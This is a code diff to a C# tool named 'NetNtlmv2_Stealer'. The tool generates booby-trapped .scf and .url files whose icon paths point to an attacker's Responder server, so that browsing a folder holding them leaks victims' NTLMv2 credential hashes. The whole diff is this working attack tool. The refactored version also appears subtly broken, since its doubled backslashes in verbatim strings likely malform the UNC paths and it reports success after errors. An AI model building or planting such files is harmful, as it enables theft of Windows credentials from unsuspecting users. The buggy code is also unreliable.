@@ -9,65 +9,55 @@ namespace NetNtlmv2_Stealer
     {
         static void Main(string[] args)
         {
-            if (args.Length < 2)
+            if (args.Length != 2)
             {
                 Console.WriteLine("[-] Usage: <Responder IP> <Output File Name>");
+                return;
             }
-            else if (args.Length == 2)
-            {
-                var argument = new List<string>();
 
-                foreach (var arg in args)
-                {
-                    argument.Add(arg);
-                }
-                string filename = argument[1];
+            string ip = args[0];
+            string filename = args[1];
 
-                // File templates
-                string scf_templ = @"[Shell]
+            // File templates
+            string[] templates = new string[2] {
+@$"[Shell]
 Command=2
-IconFile=\\" + argument[0] + @"\share\%USERNAME%.ico
+IconFile=\\\\{ip}\\share\\%USERNAME%.ico
 [Taskbar]
-Command=ToggleDesktop";
-
-                string url_templ = @"[InternetShortcut]
+Command=ToggleDesktop",
+$@"[InternetShortcut]
 URL=https://ired.team
-WorkingDirectory=C:\Users\Public
-IconFile=\\" + argument[0] + @"\%USERNAME%.icon
-IconIndex=1";
+WorkingDirectory=C:\\Users\\Public
+IconFile=\\\\{ip}\\%USERNAME%.icon
+IconIndex=1"
+            };
 
+            // Create files
+            string pwd = Directory.GetCurrentDirectory();
 
-                // Create files
-                string pwd = Directory.GetCurrentDirectory();
-                string scf = $@"{pwd}\{filename}.scf";
-                string url = $@"{pwd}\{filename}.url";
+            string[] filenames = new string[2] {
+                Path.Join(pwd, filename + ".scf"),
+                Path.Join(pwd, filename + ".url"),
+            };
 
+            for(int i = 0; i < 2; i++) {
                 try
                 {
-                    using (FileStream fs = File.Create(scf))
+                    using (FileStream fs = File.Create(filenames[i]))
                     {
-                        byte[] scf_file = Encoding.UTF8.GetBytes(scf_templ);
-                        fs.Write(scf_file, 0, scf_file.Length);
+                        byte[] file_contents = Encoding.UTF8.GetBytes(templates[i]);
+                        fs.Write(file_contents, 0, file_contents.Length);
                     }
-
-                    using (FileStream fs = File.Create(url))
-                    {
-                        byte[] url_file = Encoding.UTF8.GetBytes(url_templ);
-                        fs.Write(url_file, 0, url_file.Length);
-                    }
-
-                    Console.WriteLine("[+] Your files have been generated! Good luck ;)");
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine(ex.ToString());
+                    Console.WriteLine($"[+] Failed to generate '{filenames[i]}': " + ex.ToString());
                 }
+
+                Console.WriteLine($"[+] Generated '{filenames[i]}'");
             }
-            else
-            {
-                Console.WriteLine("[-] Error.");
-                Environment.Exit(0);
-            }
+
+            Console.WriteLine("[+] Your files have been generated! Good luck ;)");
         }
     }
 }
